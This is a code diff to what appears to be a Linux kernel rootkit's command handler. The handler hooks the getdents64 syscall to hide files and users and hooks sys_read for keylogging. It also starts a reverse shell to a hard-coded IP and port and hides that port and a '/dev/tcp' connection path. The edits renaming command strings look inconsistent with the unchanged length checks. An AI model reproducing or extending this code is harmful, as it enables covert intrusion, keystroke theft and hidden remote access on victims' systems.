@@ -181,11 +181,14 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
     #ifdef PTREGS_SYSCALL_STUB
-    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
+    if(memcmp("hide-files-users", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
             pr_info("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
+            
+            pr_info("Hiding Users: %s\n", last_data);
+            print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
                 pr_err("error hooking syscall %d\n", __NR_getdents64);
             }
@@ -204,11 +207,9 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
+    if(memcmp("keylogging", tmpdata, strlen("hide-users")) == 0){
         if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
-            pr_info("Hiding Usefrs: %s\n", last_data);
-            print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
                 pr_err("error hooking syscall read\n");
             }
@@ -235,11 +236,13 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
     #else
-    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
+    if(memcmp("hide-files-users", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
             pr_info("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
+            pr_info("Hiding Users: %s\n", last_data);
+            print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
                 pr_err("error hooking syscall %d\n", __NR_getdents64);
             }
@@ -258,11 +261,9 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
+    if(memcmp("keylogging", tmpdata, strlen("hide-users")) == 0){
         if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
-            pr_info("Hiding Users: %s\n", last_data);
-            print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
                 pr_err("error hooking syscall read\n");
             }
@@ -315,7 +316,8 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             strcpy(last_data, tmpdata);
             pr_info("Starting Reverse Shell: %s\n", last_data);
             print_list(&files_to_hide);
-            start_reverse_shell("192.168.11.1", "9010");
+            start_reverse_shell("192.168.37.128", "9010");
+            insert_node(&files_to_hide, "/dev/tcp/192.168.1.10/5555");
             insert_node(&ports_to_hide, "9010");
         }
     }
